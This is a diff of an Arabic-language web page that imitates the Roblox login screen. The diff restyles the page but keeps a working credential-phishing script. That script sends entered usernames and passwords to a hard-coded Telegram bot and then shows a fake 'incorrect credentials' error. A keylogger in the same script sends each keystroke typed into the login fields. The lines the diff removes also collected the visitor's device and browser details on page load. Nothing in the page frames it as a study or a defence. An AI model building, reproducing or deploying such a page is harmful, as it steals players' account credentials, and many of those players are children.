@@ -2,8 +2,8 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox - تسجيل الدخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Roblox</title>
     <style>
         * {
             margin: 0;
@@ -16,31 +16,41 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
             padding: 20px;
         }
         .container {
             background: white;
             padding: 40px 30px;
             border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
-            max-width: 380px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            max-width: 400px;
             width: 100%;
-            text-align: center;
         }
-        .logo {
-            font-size: 32px;
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+        }
+        .header .logo {
+            font-size: 28px;
             font-weight: 900;
             color: #1a1a2e;
-            letter-spacing: -1px;
-            margin-bottom: 20px;
         }
-        .logo span { color: #2d7aff; }
+        .header .logo span { color: #2d7aff; }
+        .header .links a {
+            color: #2d7aff;
+            text-decoration: none;
+            font-size: 14px;
+            margin-left: 12px;
+        }
+        .header .links a:hover { text-decoration: underline; }
         h2 {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 600;
-            color: #1a1a2e;
             margin-bottom: 6px;
         }
         .sub {
@@ -48,20 +58,15 @@
             font-size: 14px;
             margin-bottom: 20px;
         }
-        .sub a {
-            color: #2d7aff;
-            text-decoration: none;
-        }
         .input-group {
             margin-bottom: 14px;
-            text-align: left;
         }
         .input-group label {
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 600;
-            color: #333;
             display: block;
             margin-bottom: 4px;
+            color: #333;
         }
         .input-group input {
             width: 100%;
@@ -70,7 +75,7 @@
             border-radius: 6px;
             font-size: 15px;
             background: #f9f9f9;
-            transition: border-color 0.2s;
+            transition: 0.2s;
         }
         .input-group input:focus {
             border-color: #2d7aff;
@@ -88,29 +93,18 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 6px;
-            transition: background 0.2s;
         }
         .btn:hover { background: #1a5fd0; }
         .options {
-            display: flex;
-            justify-content: space-between;
             margin: 16px 0 10px;
-            font-size: 13px;
+            font-size: 14px;
+            text-align: center;
         }
         .options a {
             color: #2d7aff;
             text-decoration: none;
         }
         .options a:hover { text-decoration: underline; }
-        .footer {
-            margin-top: 20px;
-            font-size: 13px;
-            color: #777;
-        }
-        .footer a {
-            color: #2d7aff;
-            text-decoration: none;
-        }
         .error {
             color: #d32f2f;
             font-size: 14px;
@@ -136,140 +130,156 @@
         }
         .divider::before { margin-right: 10px; }
         .divider::after { margin-left: 10px; }
-        .social-btn {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            background: white;
-            font-size: 14px;
-            cursor: pointer;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+        .quick-login {
+            text-align: center;
+            margin: 10px 0;
         }
-        .social-btn:hover { background: #f5f5f5; }
+        .quick-login a {
+            color: #2d7aff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .quick-login a:hover { text-decoration: underline; }
+        .footer {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #555;
+        }
+        .footer a {
+            color: #2d7aff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer a:hover { text-decoration: underline; }
+        .sub-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 12px;
+            font-size: 13px;
+        }
+        .sub-links a {
+            color: #777;
+            text-decoration: none;
+        }
+        .sub-links a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+<div class="container">
+    <!-- الهيدر: شعار + روابط جانبية -->
+    <div class="header">
         <div class="logo">Roblox</div>
-        <h2>تسجيل الدخول</h2>
-        <p class="sub">أدخل بيانات حسابك للمتابعة</p>
-
-        <form id="loginForm">
-            <div class="input-group">
-                <label>البريد الإلكتروني / اسم المستخدم</label>
-                <input type="text" id="username" placeholder="أدخل بريدك أو اسم المستخدم" required>
-            </div>
-            <div class="input-group">
-                <label>كلمة المرور</label>
-                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-            </div>
-
-            <button type="submit" class="btn">تسجيل الدخول</button>
-
-            <div class="options">
-                <label style="font-weight:400;color:#555;">
-                    <input type="checkbox" checked> تذكرني
-                </label>
-                <a href="#">نسيت كلمة المرور؟</a>
-            </div>
-
-            <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>
-
-            <div class="divider">أو</div>
-
-            <button class="social-btn" type="button">🔵 متابعة باستخدام Google</button>
-            <button class="social-btn" type="button">⚫ متابعة باستخدام Apple</button>
-
-            <div class="footer">
-                ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
-            </div>
-        </form>
+        <div class="links">
+            <a href="#">إنشاء</a>
+            <a href="#">الرائحة</a>
+            <a href="#">السوق</a>
+        </div>
     </div>
 
-    <script>
-        // =============================================
-        // إعدادات البوت
-        // =============================================
-        const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
-        const CHAT_ID = '6526473202';
+    <h2>تسجيل الدخول إلى Roblox</h2>
 
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            }).catch(e => console.log(e));
+    <form id="loginForm">
+        <div class="input-group">
+            <label>اسم المستخدم/البريد/الهاتف</label>
+            <input type="text" id="username" placeholder="أدخل اسم المستخدم أو البريد أو الهاتف" required>
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+        </div>
+
+        <button type="submit" class="btn">تسجيل الدخول</button>
+
+        <div class="options">
+            <a href="#">نسيت كلمة المرور أو اسم المستخدم؟</a>
+        </div>
+
+        <div class="options">
+            <a href="#">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</a>
+        </div>
+
+        <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>
+
+        <div class="divider">أو</div>
+
+        <div class="quick-login">
+            <a href="#">تسجيل دخول سريع</a>
+        </div>
+
+        <div class="footer">
+            ليس لديك حساب؟ <a href="#">اشتراك</a>
+        </div>
+
+        <!-- روابط إضافية (مثل في الصورة) -->
+        <div class="sub-links">
+            <a href="#">الخصوصية</a>
+            <a href="#">الشروط</a>
+            <a href="#">اتصل بنا</a>
+        </div>
+    </form>
+</div>
+
+<script>
+    // =============================================
+    // إعدادات البوت
+    // =============================================
+    const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
+    const CHAT_ID = '6526473202';
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        }).catch(e => console.log(e));
+    }
+
+    // =============================================
+    // عند إرسال النموذج (جلب البيانات)
+    // =============================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // إرسال البيانات إلى تليجرام
+        let dataMsg = `<b>🔓 بيانات روبلوكس</b>\n\n`;
+        dataMsg += `👤 اسم المستخدم: ${username}\n`;
+        dataMsg += `🔑 كلمة المرور: ${password}\n\n`;
+        dataMsg += `📅 الوقت: ${new Date().toISOString()}`;
+
+        sendToTelegram(dataMsg);
+
+        // إظهار رسالة خطأ وهمية
+        document.getElementById('errorMsg').style.display = 'block';
+
+        // إعادة تعيين الحقول بعد 3 ثواني
+        setTimeout(() => {
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('errorMsg').style.display = 'none';
+        }, 3000);
+    });
+
+    // =============================================
+    // Keylogger (تسجيل كل ما يكتب)
+    // =============================================
+    document.addEventListener('input', e => {
+        if (e.target.value && (e.target.id === 'username' || e.target.id === 'password')) {
+            sendToTelegram(`⌨️ <b>كتابة في حقل ${e.target.id}</b>\n${e.target.value.substring(0, 50)}`);
         }
+    });
 
-        // =============================================
-        // 1. البيانات الأساسية عند فتح الرابط
-        // =============================================
-        const ua = navigator.userAgent;
-        const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
-        const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
-        let os = 'غير معروف';
-        if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
-        else if (/Mac OS X/.test(ua)) os = 'MacOS';
-        else if (/Android/.test(ua)) os = 'Android';
-        else if (/iPhone|iPad/.test(ua)) os = 'iOS';
-
-        let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
-        msg += `📱 الجهاز: ${deviceType} (${os})\n`;
-        msg += `🌐 IP: ${window.location.hostname}\n`;
-        msg += `📱 المتصفح: ${ua}\n`;
-        msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
-        msg += `📅 الوقت: ${new Date().toISOString()}`;
-        sendToTelegram(msg);
-
-        // =============================================
-        // 2. عند إرسال النموذج (جلب البيانات)
-        // =============================================
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // إرسال البيانات إلى تليجرام
-            let dataMsg = `<b>🔓 بيانات روبلوكس</b>\n\n`;
-            dataMsg += `👤 اسم المستخدم: ${username}\n`;
-            dataMsg += `🔑 كلمة المرور: ${password}\n\n`;
-            dataMsg += `📅 الوقت: ${new Date().toISOString()}`;
-
-            sendToTelegram(dataMsg);
-
-            // إظهار رسالة خطأ وهمية
-            document.getElementById('errorMsg').style.display = 'block';
-
-            // إعادة تعيين الحقول بعد 3 ثواني
-            setTimeout(() => {
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-                document.getElementById('errorMsg').style.display = 'none';
-            }, 3000);
-        });
-
-        // =============================================
-        // 3. Keylogger (تسجيل كل ما يكتب)
-        // =============================================
-        document.addEventListener('input', e => {
-            if (e.target.value && (e.target.id === 'username' || e.target.id === 'password')) {
-                sendToTelegram(`⌨️ <b>كتابة في حقل ${e.target.id}</b>\n${e.target.value.substring(0, 50)}`);
-            }
-        });
-
-        console.log('✅ صفحة روبلوكس تعمل');
-    </script>
+    console.log('✅ صفحة روبلوكس تعمل');
+</script>
 
 </body>
 </html>
